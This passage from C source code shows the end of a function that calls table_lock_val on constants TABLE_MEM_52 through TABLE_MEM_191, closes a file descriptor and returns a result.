    table_lock_val(TABLE_MEM_52);
    table_lock_val(TABLE_MEM_53);
    table_lock_val(TABLE_MEM_54);
    table_lock_val(TABLE_MEM_55);
    table_lock_val(TABLE_MEM_56);
    table_lock_val(TABLE_MEM_57);
    table_lock_val(TABLE_MEM_58);
    table_lock_val(TABLE_MEM_59);
    table_lock_val(TABLE_MEM_60);
    table_lock_val(TABLE_MEM_61);
    table_lock_val(TABLE_MEM_62);
    table_lock_val(TABLE_MEM_63);
    table_lock_val(TABLE_MEM_64);
    table_lock_val(TABLE_MEM_65);
    table_lock_val(TABLE_MEM_66);
    table_lock_val(TABLE_MEM_67);
    table_lock_val(TABLE_MEM_68);
    table_lock_val(TABLE_MEM_69);
    table_lock_val(TABLE_MEM_70);
    table_lock_val(TABLE_MEM_71);
    table_lock_val(TABLE_MEM_72);
    table_lock_val(TABLE_MEM_73);
    table_lock_val(TABLE_MEM_74);
    table_lock_val(TABLE_MEM_75);
    table_lock_val(TABLE_MEM_76);
    table_lock_val(TABLE_MEM_77);
    table_lock_val(TABLE_MEM_78);
    table_lock_val(TABLE_MEM_79);
    table_lock_val(TABLE_MEM_80);
    table_lock_val(TABLE_MEM_81);
    table_lock_val(TABLE_MEM_82);
    table_lock_val(TABLE_MEM_83);
    table_lock_val(TABLE_MEM_84);
    table_lock_val(TABLE_MEM_85);
    table_lock_val(TABLE_MEM_86);
    table_lock_val(TABLE_MEM_87);
    table_lock_val(TABLE_MEM_88);
    table_lock_val(TABLE_MEM_89);
    table_lock_val(TABLE_MEM_90);
    table_lock_val(TABLE_MEM_91);
    table_lock_val(TABLE_MEM_92);
    table_lock_val(TABLE_MEM_93);
    table_lock_val(TABLE_MEM_94);
    table_lock_val(TABLE_MEM_95);
    table_lock_val(TABLE_MEM_96);
    table_lock_val(TABLE_MEM_97);
    table_lock_val(TABLE_MEM_98);
    table_lock_val(TABLE_MEM_99);
    table_lock_val(TABLE_MEM_100);
    table_lock_val(TABLE_MEM_101);
    table_lock_val(TABLE_MEM_102);
    table_lock_val(TABLE_MEM_103);
    table_lock_val(TABLE_MEM_104);
    table_lock_val(TABLE_MEM_105);
    table_lock_val(TABLE_MEM_106);
    table_lock_val(TABLE_MEM_107);
    table_lock_val(TABLE_MEM_108);
    table_lock_val(TABLE_MEM_109);
    table_lock_val(TABLE_MEM_110);
    table_lock_val(TABLE_MEM_111);
    table_lock_val(TABLE_MEM_112);
    table_lock_val(TABLE_MEM_113);
    table_lock_val(TABLE_MEM_114);
    table_lock_val(TABLE_MEM_115);
    table_lock_val(TABLE_MEM_116);
    table_lock_val(TABLE_MEM_117);
    table_lock_val(TABLE_MEM_118);
    table_lock_val(TABLE_MEM_119);
    table_lock_val(TABLE_MEM_120);
    table_lock_val(TABLE_MEM_121);
    table_lock_val(TABLE_MEM_122);
    table_lock_val(TABLE_MEM_123);
    table_lock_val(TABLE_MEM_124);
    table_lock_val(TABLE_MEM_125);
    table_lock_val(TABLE_MEM_126);
    table_lock_val(TABLE_MEM_127);
    table_lock_val(TABLE_MEM_128);
    table_lock_val(TABLE_MEM_129);
    table_lock_val(TABLE_MEM_130);
    table_lock_val(TABLE_MEM_131);
    table_lock_val(TABLE_MEM_132);
    table_lock_val(TABLE_MEM_133);
    table_lock_val(TABLE_MEM_134);
    table_lock_val(TABLE_MEM_135);
    table_lock_val(TABLE_MEM_136);
    table_lock_val(TABLE_MEM_137);
    table_lock_val(TABLE_MEM_138);
    table_lock_val(TABLE_MEM_139);
    table_lock_val(TABLE_MEM_140);
    table_lock_val(TABLE_MEM_141);
    table_lock_val(TABLE_MEM_142);
    table_lock_val(TABLE_MEM_143);
    table_lock_val(TABLE_MEM_144);
    table_lock_val(TABLE_MEM_145);
    table_lock_val(TABLE_MEM_146);
    table_lock_val(TABLE_MEM_147);
    table_lock_val(TABLE_MEM_148);
    table_lock_val(TABLE_MEM_149);
    table_lock_val(TABLE_MEM_150);
    table_lock_val(TABLE_MEM_151);
    table_lock_val(TABLE_MEM_152);
    table_lock_val(TABLE_MEM_153);
    table_lock_val(TABLE_MEM_154);
    table_lock_val(TABLE_MEM_155);
    table_lock_val(TABLE_MEM_156);
    table_lock_val(TABLE_MEM_157);
    table_lock_val(TABLE_MEM_158);
    table_lock_val(TABLE_MEM_159);
    table_lock_val(TABLE_MEM_160);
    table_lock_val(TABLE_MEM_161);
    table_lock_val(TABLE_MEM_162);
    table_lock_val(TABLE_MEM_163);
    table_lock_val(TABLE_MEM_164);
    table_lock_val(TABLE_MEM_165);
    table_lock_val(TABLE_MEM_166);
    table_lock_val(TABLE_MEM_167);
    table_lock_val(TABLE_MEM_168);
    table_lock_val(TABLE_MEM_169);
    table_lock_val(TABLE_MEM_170);
    table_lock_val(TABLE_MEM_171);
    table_lock_val(TABLE_MEM_172);
    table_lock_val(TABLE_MEM_173);
    table_lock_val(TABLE_MEM_174);
    table_lock_val(TABLE_MEM_175);
    table_lock_val(TABLE_MEM_176);
    table_lock_val(TABLE_MEM_177);
    table_lock_val(TABLE_MEM_178);
    table_lock_val(TABLE_MEM_179);
    table_lock_val(TABLE_MEM_180);
    table_lock_val(TABLE_MEM_181);
    table_lock_val(TABLE_MEM_182);
    table_lock_val(TABLE_MEM_183);
    table_lock_val(TABLE_MEM_184);
    table_lock_val(TABLE_MEM_185);
    table_lock_val(TABLE_MEM_186);
    table_lock_val(TABLE_MEM_187);
    table_lock_val(TABLE_MEM_188);
    table_lock_val(TABLE_MEM_189);
    table_lock_val(TABLE_MEM_190);
    table_lock_val(TABLE_MEM_191);

    close(fd);

    return found;
}